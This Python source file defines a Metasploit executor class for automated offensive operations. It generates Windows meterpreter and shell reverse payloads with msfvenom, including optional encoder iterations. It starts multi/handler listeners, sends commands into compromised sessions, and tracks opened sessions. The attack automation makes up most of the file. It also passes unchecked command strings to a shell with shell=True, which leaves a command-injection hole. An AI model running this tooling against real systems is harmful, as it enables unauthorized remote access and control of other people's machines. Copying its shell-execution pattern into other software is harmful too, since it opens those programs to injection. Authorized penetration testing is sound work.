"""
Metasploit Executor - Direct execution of msfconsole and msfvenom commands.

Provides:
- Real msfconsole command execution
- msfvenom payload generation
- Resource script (.rc) execution
- Session management and interaction
- Live command/output streaming
"""

import logging
import re
import subprocess
import threading
import time
from dataclasses import dataclass
from enum import Enum
from queue import Empty, Queue
from typing import Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class ExploitStatus(Enum):
    """Status of an exploit execution."""

    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    COMPLETED = "completed"


class PayloadType(Enum):
    """Types of payloads available."""

    REVERSE_TCP = "reverse_tcp"
    REVERSE_HTTP = "reverse_http"
    REVERSE_HTTPS = "reverse_https"
    BIND_TCP = "bind_tcp"
    METERPRETER = "meterpreter"
    SHELL = "shell"


@dataclass
class SessionInfo:
    """Information about an active Metasploit session."""

    session_id: str
    session_type: str  # meterpreter, shell, etc.
    target_ip: str
    target_os: Optional[str] = None
    username: Optional[str] = None
    privilege_level: Optional[str] = None
    description: Optional[str] = None
    created_at: Optional[str] = None


@dataclass
class ListenerInfo:
    """Information about an active listener/handler."""

    handler_id: str
    lhost: str
    lport: int
    payload: str
    status: str  # active, stopped
    created_at: Optional[str] = None


@dataclass
class ExploitResult:
    """Result of an exploit execution."""

    command: str
    exit_code: int
    stdout: str
    stderr: str
    duration: float
    sessions_created: List[SessionInfo] = None
    listeners_started: List[ListenerInfo] = None
    error: Optional[str] = None


class MetasploitExecutor:
    """
    Direct executor for Metasploit commands.

    Features:
    - Execute msfconsole commands in real-time
    - Generate payloads with msfvenom
    - Manage resource scripts
    - Track sessions and listeners
    - Stream output for live terminal display
    """

    def __init__(self):
        """Initialize the Metasploit executor."""
        self.active_sessions: Dict[str, SessionInfo] = {}
        self.active_listeners: Dict[str, ListenerInfo] = {}
        self.output_callback: Optional[Callable[[str], None]] = None
        self.is_metasploit_available = self._check_metasploit_availability()

        logger.info(
            f"MetasploitExecutor initialized - Metasploit available: {self.is_metasploit_available}"
        )

    def _check_metasploit_availability(self) -> bool:
        """Check if msfconsole is available on the system."""
        try:
            result = subprocess.run(
                ["which", "msfconsole"], capture_output=True, text=True, timeout=5
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, subprocess.SubprocessError):
            logger.warning("Could not verify msfconsole availability")
            return False

    def set_output_callback(self, callback: Callable[[str], None]) -> None:
        """
        Set callback for real-time output streaming.

        Args:
            callback: Function to call with output lines
        """
        self.output_callback = callback

    def execute_command(
        self, command: str, timeout: int = 300, background: bool = False
    ) -> ExploitResult:
        """
        Execute a metasploit command.

        Args:
            command: Command to execute (msfconsole, msfvenom, etc.)
            timeout: Command timeout in seconds
            background: Whether to run in background

        Returns:
            ExploitResult with execution details
        """
        if not self.is_metasploit_available:
            return ExploitResult(
                command=command,
                exit_code=1,
                stdout="",
                stderr="Metasploit not available on this system",
                duration=0.0,
            )

        start_time = time.time()

        try:
            if background:
                return self._execute_background_command(command, timeout)
            else:
                return self._execute_direct_command(command, timeout, start_time)

        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error executing command '{command}': {e}")
            return ExploitResult(
                command=command,
                exit_code=1,
                stdout="",
                stderr=str(e),
                duration=duration,
            )

    def _execute_direct_command(
        self, command: str, timeout: int, start_time: float
    ) -> ExploitResult:
        """Execute command directly and capture output."""
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            universal_newlines=True,
        )

        stdout_lines = []
        stderr_lines = []

        try:
            stdout, stderr = process.communicate(timeout=timeout)
            duration = time.time() - start_time

            stdout_lines = stdout.split("\n")
            stderr_lines = stderr.split("\n")

            # Stream output if callback is set
            if self.output_callback:
                for line in stdout_lines:
                    if line.strip():
                        self.output_callback(line)
                for line in stderr_lines:
                    if line.strip():
                        self.output_callback(f"[ERROR] {line}")

            # Parse sessions and listeners from output
            sessions = self._parse_sessions(stdout)
            listeners = self._parse_listeners(stdout)

            return ExploitResult(
                command=command,
                exit_code=process.returncode,
                stdout=stdout,
                stderr=stderr,
                duration=duration,
                sessions_created=sessions,
                listeners_started=listeners,
            )

        except subprocess.TimeoutExpired:
            process.kill()
            duration = time.time() - start_time
            return ExploitResult(
                command=command,
                exit_code=124,  # Timeout exit code
                stdout="\n".join(stdout_lines),
                stderr=f"Command timed out after {timeout} seconds",
                duration=duration,
            )

    def _execute_background_command(self, command: str, timeout: int) -> ExploitResult:
        """Execute command in background and return immediately."""
        start_time = time.time()

        def run_command():
            try:
                subprocess.run(
                    command, shell=True, timeout=timeout, capture_output=True, text=True
                )
            except subprocess.TimeoutExpired:
                logger.warning(f"Background command timed out: {command}")
            except Exception as e:
                logger.error(f"Background command error: {e}")

        thread = threading.Thread(target=run_command, daemon=True)
        thread.start()

        duration = time.time() - start_time

        return ExploitResult(
            command=command,
            exit_code=0,
            stdout="Command started in background",
            stderr="",
            duration=duration,
        )

    def execute_msfconsole(
        self, commands: List[str], timeout: int = 300
    ) -> ExploitResult:
        """
        Execute multiple msfconsole commands.

        Args:
            commands: List of msfconsole commands
            timeout: Total timeout for all commands

        Returns:
            ExploitResult with combined output
        """
        if not self.is_metasploit_available:
            return ExploitResult(
                command="msfconsole session",
                exit_code=1,
                stdout="",
                stderr="Metasploit not available on this system",
                duration=0.0,
            )

        # Create resource script
        resource_content = "\n".join(commands)
        resource_file = f"/tmp/msf_commands_{int(time.time())}.rc"

        try:
            with open(resource_file, "w") as f:
                f.write(resource_content)

            # Execute resource script
            command = f"msfconsole -r {resource_file}"
            return self.execute_command(command, timeout)

        finally:
            # Clean up resource file
            try:
                import os

                os.remove(resource_file)
            except OSError:
                pass

    def generate_payload(
        self,
        payload_type: PayloadType,
        lhost: str,
        lport: int,
        format: str = "exe",
        encoder: Optional[str] = None,
        iterations: int = 1,
    ) -> ExploitResult:
        """
        Generate a payload using msfvenom.

        Args:
            payload_type: Type of payload to generate
            lhost: Local host for callbacks
            lport: Local port for callbacks
            format: Output format (exe, elf, apk, etc.)
            encoder: Optional encoder to use
            iterations: Number of encoding iterations

        Returns:
            ExploitResult with payload generation details
        """
        if not self.is_metasploit_available:
            return ExploitResult(
                command="msfvenom payload generation",
                exit_code=1,
                stdout="",
                stderr="Metasploit not available on this system",
                duration=0.0,
            )

        # Build msfvenom command
        payload_map = {
            PayloadType.REVERSE_TCP: "windows/meterpreter/reverse_tcp",
            PayloadType.REVERSE_HTTP: "windows/meterpreter/reverse_http",
            PayloadType.REVERSE_HTTPS: "windows/meterpreter/reverse_https",
            PayloadType.BIND_TCP: "windows/meterpreter/bind_tcp",
            PayloadType.METERPRETER: "windows/meterpreter/reverse_tcp",
            PayloadType.SHELL: "windows/shell/reverse_tcp",
        }

        payload = payload_map.get(payload_type, "windows/meterpreter/reverse_tcp")

        command_parts = [
            "msfvenom",
            f"-p {payload}",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            f"-f {format}",
        ]

        if encoder:
            command_parts.extend(["-e", encoder])

        if iterations > 1:
            command_parts.extend(["-i", str(iterations)])

        command = " ".join(command_parts)

        logger.info(f"Generating payload: {command}")
        return self.execute_command(command, timeout=60)

    def setup_listener(
        self, payload_type: PayloadType, lhost: str, lport: int, auto_run: bool = True
    ) -> ExploitResult:
        """
        Set up a metasploit listener/handler.

        Args:
            payload_type: Type of payload to listen for
            lhost: Local host for listener
            lport: Local port for listener
            auto_run: Whether to auto-run the handler

        Returns:
            ExploitResult with listener setup details
        """
        payload_map = {
            PayloadType.REVERSE_TCP: "windows/meterpreter/reverse_tcp",
            PayloadType.REVERSE_HTTP: "windows/meterpreter/reverse_http",
            PayloadType.REVERSE_HTTPS: "windows/meterpreter/reverse_https",
            PayloadType.BIND_TCP: "windows/meterpreter/bind_tcp",
            PayloadType.METERPRETER: "windows/meterpreter/reverse_tcp",
            PayloadType.SHELL: "windows/shell/reverse_tcp",
        }

        payload = payload_map.get(payload_type, "windows/meterpreter/reverse_tcp")

        commands = [
            f"use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
        ]

        if auto_run:
            commands.append("exploit -j")  # Run in job mode

        return self.execute_msfconsole(commands)

    def interact_with_session(self, session_id: str, command: str) -> ExploitResult:
        """
        Send a command to an active session.

        Args:
            session_id: ID of the session to interact with
            command: Command to send to the session

        Returns:
            ExploitResult with command execution details
        """
        commands = [f"session -i {session_id}", f"execute -f {command}", "background"]

        return self.execute_msfconsole(commands)

    def _parse_sessions(self, output: str) -> List[SessionInfo]:
        """Parse session information from msfconsole output."""
        sessions = []

        # Look for session creation messages
        session_patterns = [
            r"\[\*\]\s+Session\s+(\d+)\s+opened",
            r"\[\*\]\s+Meterpreter\s+session\s+(\d+)\s+opened",
            r"\[\*\]\s+Shell\s+session\s+(\d+)\s+opened",
        ]

        for pattern in session_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                session = SessionInfo(
                    session_id=match,
                    session_type=(
                        "meterpreter" if "meterpreter" in output.lower() else "shell"
                    ),
                    target_ip="unknown",  # Would need more parsing
                    description=f"Session {match} opened",
                )
                sessions.append(session)
                self.active_sessions[match] = session

        return sessions

    def _parse_listeners(self, output: str) -> List[ListenerInfo]:
        """Parse listener information from msfconsole output."""
        listeners = []

        # Look for handler started messages
        if "exploit" in output.lower() and "started" in output.lower():
            # This is a simplified parser - real implementation would need more detail
            listener = ListenerInfo(
                handler_id="handler_1",
                lhost="0.0.0.0",
                lport=4444,
                payload="windows/meterpreter/reverse_tcp",
                status="active",
            )
            listeners.append(listener)
            self.active_listeners["handler_1"] = listener

        return listeners

    def get_active_sessions(self) -> Dict[str, SessionInfo]:
        """Get all active sessions."""
        return self.active_sessions.copy()

    def get_active_listeners(self) -> Dict[str, ListenerInfo]:
        """Get all active listeners."""
        return self.active_listeners.copy()

    def cleanup_session(self, session_id: str) -> bool:
        """
        Clean up an active session.

        Args:
            session_id: ID of the session to clean up

        Returns:
            True if successful
        """
        if session_id in self.active_sessions:
            try:
                # Send session kill command
                commands = [f"session -k {session_id}"]
                self.execute_msfconsole(commands)
                del self.active_sessions[session_id]
                logger.info(f"Session {session_id} cleaned up")
                return True
            except Exception as e:
                logger.error(f"Failed to cleanup session {session_id}: {e}")
                return False
        return False

    def stop_listener(self, handler_id: str) -> bool:
        """
        Stop an active listener.

        Args:
            handler_id: ID of the handler to stop

        Returns:
            True if successful
        """
        if handler_id in self.active_listeners:
            try:
                # Stop the handler job
                commands = [f"jobs -K"]
                self.execute_msfconsole(commands)
                del self.active_listeners[handler_id]
                logger.info(f"Listener {handler_id} stopped")
                return True
            except Exception as e:
                logger.error(f"Failed to stop listener {handler_id}: {e}")
                return False
        return False

    def is_available(self) -> bool:
        """Check if metasploit is available for use."""
        return self.is_metasploit_available

    def detect_terminal_mode(self, command: str) -> bool:
        """
        Detect if a command should trigger terminal mode.

        Args:
            command: Command to analyze

        Returns:
            True if command should trigger terminal mode
        """
        import re

        # Check for metasploit-related commands
        metasploit_patterns = [
            r"\bmsfconsole\b",
            r"\bmsfvenom\b",
            r"\bmetasploit\b",
            r"\bexploit\b.*\bwindows\b",
            r"\bexploit\b.*\blinux\b",
            r"\bexploit\b.*\bsmb\b",
            r"\bexploit\b.*\bssh\b",
            r"\bhandler\b",
            r"\breverse\b.*\btcp\b",
            r"\bmeterpreter\b",
            r"\bsession\b.*\bopen\b",
            r"\b\.rc\b",  # Resource scripts
        ]

        for pattern in metasploit_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                return True

        return False
